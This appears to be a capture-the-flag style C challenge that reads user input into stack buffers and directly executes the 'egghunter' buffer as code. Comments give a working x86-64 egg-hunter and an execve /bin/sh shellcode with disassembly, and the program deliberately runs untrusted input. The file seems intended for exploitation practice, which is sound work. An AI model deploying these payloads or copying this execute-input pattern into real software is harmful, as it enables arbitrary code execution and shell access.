#include <stdio.h>
#include <stdlib.h>
int main(void)

{      

    setbuf(stdout, 0);
	setbuf(stdin, 0);
	setbuf(stderr, 0);

    char egghunter[20];

    //     "\x54"                          /* push   %rsp */

    //   "\x59"                          /* pop    %rcx */

    //     "\x48\x83\xc1\x18"              /* add    $0x18,%rcx */

    //     "\x48\xff\xc1"                  /* inc    %rcx */

    //     "\x81\x79\xfc\x7a\x30\x78\x30"  /* cmpl   $egg,-0x4(%rcx) */

    //     "\x75\xf4"                      /* jne    6 hunt */

    //     "\xff\xe1"                      /* jmpq   *%rcx */;

    
    printf("What is your name hunter? : ");
    scanf("%20s",egghunter);

 

    char stackgarbage[] =

        "I am the hunter, I am the great unknown"
        "Only my love can conquer"
        "I am the, I am the hunter (I am the hunter)"
        "I am the hunter, into the wild, we go"
        "Give up your heart, surrender"
        "'Cause I am the, I am the hunter (I am the, hey!)"
        "We've been on this road"
        "To a place that, one day, we'll know"
        "Adventure to the other side (I am the, I am the)"
        "Searching high and low for the treasure deep in your soul"
        "The fortune teller's always right"
        "Got them red eyes in the night"
        "Like a panther, outta sight"
        "Gonna sing my battle cry"
        ;

 

    char eggpayload[28];

    //     "z0x0"                          /* egg */

    //     "\x31\xf6"                      /* xor    %esi,%esi */

    //   "\x48\xbf\xd1\x9d\x96\x91\xd0"  /* movabs $str,%rdi */

    //     "\x8c\x97\xff"                  /* . */

    //     "\x48\xf7\xdf"                  /* neg    %rdi */

    //    "\xf7\xe6"                      /* mul    %esi */

    //     "\x04\x3b"                      /* add    $0x3b,%al */

    //     "\x57"                          /* push   %rdi */

    //     "\x54"                          /* push   %rsp */

    //     "\x5f"                          /* pop    %rdi */

    //     "\x0f\x05"                      /* syscall */;

    printf("What is your most precious possession? : ");
    
    scanf("%28s",eggpayload);
    // printf("%d", sizeof(egghunter));
    (*(void(*)()) egghunter)();

 

    return 0;

}
